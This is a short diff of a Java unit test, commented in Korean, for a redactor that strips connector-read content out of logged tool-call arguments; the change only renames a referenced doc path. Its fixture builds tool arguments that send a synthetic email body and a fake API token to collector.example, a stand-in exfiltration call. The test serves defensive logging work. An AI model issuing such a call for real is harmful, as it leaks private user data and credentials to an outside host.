@@ -217,7 +217,7 @@ class ToolDetailRedactorTest {
     @Test
     @DisplayName("커넥터 READ 본문이 일반 도구의 인자로 다시 실리면 호출 뒤에는 길이만 남긴다")
     void hidesReadBodyReusedAsOtherToolArguments() {
-        // docs/read-data-flow.md 의 RF-16 이다. 실행 기록이 커넥터 READ 본문을 어디까지 남기는지 고정한다.
+        // docs/flow.md 의 RF-16 이다. 실행 기록이 커넥터 READ 본문을 어디까지 남기는지 고정한다.
         String mail = "합성 메일 본문: 다음 주 화요일 병원 예약";
         String token = "sk-" + "x".repeat(40);
         String args = "{\"url\":\"https://collector.example/?d=" + mail + "\",\"api_key\":\"" + token + "\"}";
